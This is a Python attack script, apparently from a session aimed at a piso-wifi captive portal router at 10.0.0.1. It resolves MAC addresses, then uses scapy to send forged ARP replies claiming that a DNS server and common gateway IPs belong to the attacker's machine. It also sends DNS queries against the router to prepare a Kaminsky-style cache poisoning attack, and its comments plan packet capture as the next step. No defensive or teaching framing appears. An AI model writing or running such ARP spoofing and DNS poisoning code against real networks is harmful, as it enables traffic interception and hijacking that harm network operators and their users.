import time
import sys
import socket
import struct
import os
import threading

target_ip = "10.0.0.1"
our_ip = "10.0.20.233"

def get_mac_windows(ip):
    try:
        output = os.popen(f"arp -a {ip} 2>nul").read()
        for line in output.split("\n"):
            if ip in line and "dynamic" in line.lower():
                parts = line.split()
                for part in parts:
                    if "-" in part and ":" not in part and len(part.replace("-","")) == 12:
                        return part.replace("-",":")
        # Try parsing differently
        import subprocess
        result = subprocess.run(["arp", "-a", ip], capture_output=True, text=True)
        for line in result.stdout.split("\n"):
            if ip in line:
                parts = line.split()
                for p in parts:
                    if "-" in p or ":" in p:
                        return p.replace("-", ":").lower()
        return None
    except:
        return None

def send_raw_arp(opcode, sender_mac, sender_ip, target_mac, target_ip):
    """Send a raw ARP packet using raw sockets"""
    try:
        # Build Ethernet frame
        dest_mac_bytes = bytes.fromhex(target_mac.replace(":", ""))
        src_mac_bytes = bytes.fromhex(sender_mac.replace(":", ""))
        
        # ARP header
        htype = struct.pack("!H", 1)  # Ethernet
        ptype = struct.pack("!H", 0x0800)  # IPv4
        hlen = struct.pack("B", 6)
        plen = struct.pack("B", 4)
        oper = struct.pack("!H", opcode)  # 1=request, 2=reply
        
        sender_mac_bytes = bytes.fromhex(sender_mac.replace(":", ""))
        sender_ip_bytes = socket.inet_aton(sender_ip)
        target_mac_bytes = bytes.fromhex(target_mac.replace(":", ""))
        target_ip_bytes = socket.inet_aton(target_ip)
        
        arp_packet = htype + ptype + hlen + plen + oper + sender_mac_bytes + sender_ip_bytes + target_mac_bytes + target_ip_bytes
        
        # Ethernet frame
        eth_type = struct.pack("!H", 0x0806)  # ARP
        ethernet_frame = dest_mac_bytes + src_mac_bytes + eth_type + arp_packet
        
        # Send via raw socket
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        s.bind(("wlan0", 0))  # This won't work on Windows
        s.send(ethernet_frame)
        s.close()
        return True
    except:
        return False

def win_arp_spoof(target_ip, gateway_ip):
    """Windows ARP spoofing using arp command"""
    # On Windows, we can't easily send raw ARP replies
    # But we can try to add a static ARP entry with wrong info
    our_mac = get_mac_windows(target_ip)
    print(f"[*] Our MAC: {our_mac}")
    
    # Try to use arp.exe to poison
    # arp -s <IP> <MAC> adds a static entry
    # But this only affects our machine, not the target
    
    # Alternative: use PowerShell to add static ARP
    # But this won't affect the device (10.0.0.1)
    
    print("[*] Windows ARP spoofing limited - need raw socket access")
    print("[*] Trying alternative approach: DNS target flooding...")
    
    return False

# Try to use Npcap for packet injection
def try_npcap_injection():
    print("[*] Checking for Npcap/WinPcap...")
    try:
        from scapy.all import conf
        print(f"[*] Scapy available: {conf.name}")
        return True
    except ImportError:
        print("[-] Scapy not installed")
        pass
    
    # Check for npcap in system
    if os.path.exists("C:\\Windows\\System32\\Npcap"):
        print("[*] Npcap found in System32")
    
    # Try to use pypcap
    try:
        import pcap
        print("[*] pypcap available")
        return True
    except ImportError:
        print("[-] pypcap not available")
    
    return False

print("=== ARP Spoofing Attempt ===")
print(f"[*] Target: {target_ip}")
print(f"[*] Our IP: {our_ip}")

# Get MAC of target
target_mac = get_mac_windows(target_ip)
if target_mac:
    print(f"[*] Target MAC: {target_mac}")
else:
    print("[-] Could not get target MAC")
    # Try to ping first to populate ARP cache
    os.system(f"ping -n 1 {target_ip} > nul 2>&1")
    target_mac = get_mac_windows(target_ip)
    if target_mac:
        print(f"[*] Target MAC (after ping): {target_mac}")

our_mac = get_mac_windows(our_ip)
if our_mac:
    print(f"[*] Our MAC: {our_mac}")

# Check if scapy can be installed
print()
print("=== Scapy check ===")
try:
    import scapy.all as scapy
    print("[*] Scapy IS available!")
    
    # Try ARP spoofing with scapy
    print("[*] Attempting ARP spoofing via scapy...")
    
    got_mac = target_mac or get_mac_windows(target_ip)
    our_mac = get_mac_windows(our_ip)
    
    if got_mac and our_mac:
        print(f"[*] Spoofing: {target_ip} is at {our_mac}")
        # Tell target that we are various IPs
        # For DNS poisoning: tell target that 94.140.14.14 (DNS) is at our MAC
        # This won't affect the DNS traffic on the WAN port but worth trying
        
        # Actually let's try to poison the target's ARP cache about the default gateway
        # If the WAN gateway is on the same subnet as us
        
        # Send ARP reply telling target_ip that various hosts are at our mac
        try:
            # Tell target that any IP is at our MAC
            import scapy.all
            pkt = scapy.all.Ether(dst=got_mac) / scapy.all.ARP(op=2, pdst=target_ip, hwdst=got_mac, psrc="94.140.14.14")
            scapy.all.sendp(pkt, verbose=0)
            print("[*] Sent ARP spoof packet: 94.140.14.14 is at our MAC")
            
            # Also try spoofing common gateway IPs
            for gw in ["192.168.1.1", "192.168.0.1", "10.0.0.1", "172.16.0.1", "192.168.1.254"]:
                pkt = scapy.all.Ether(dst=got_mac) / scapy.all.ARP(op=2, pdst=target_ip, hwdst=got_mac, psrc=gw)
                scapy.all.sendp(pkt, verbose=0)
            print("[*] Sent ARP spoof packets for common gateways")
        except Exception as e:
            print(f"[-] ARP spoofing failed: {e}")
    else:
        print("[-] Could not get MAC addresses")
        
except ImportError:
    print("[-] Scapy not available. Try: pip install scapy")

print()
print("=== Alternative: DNS Cache Poisoning via Kaminsky-style attack ===")
print("[*] Sending test DNS query and forging response...")

# This won't work perfectly without knowing source port/TXID
# but let's try with common source ports
def test_dns_poison():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        
        # Build DNS query for lpb.lpbpisowifi.com
        import random
        tid = random.randint(0, 65535)
        header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
        qname = b"\x03lpb\x0blpbpisowifi\x03com\x00"
        question = qname + struct.pack(">HH", 1, 1)
        query = header + question
        
        s.sendto(query, (target_ip, 53))
        
        # Try to receive and measure response time
        start = time.time()
        data, addr = s.recvfrom(2048)
        elapsed = time.time() - start
        print(f"[*] DNS response in {elapsed:.3f}s from {addr}")
        
        # Now we know the server responds.
        # For cache poisoning, we'd need to know the source port of outbound query.
        # The DNS server (dnsmasq) listens on port 53 FORWARDING queries.
        # Source port for outbound queries is random (ephemeral).
        
        s.close()
        return elapsed
    except:
        pass
    return None

test_dns_poison()

print()
print("[*] Next step: Check if we can observe the outbound DNS query")
print("[*] Try monitoring DNS requests with packet capture")
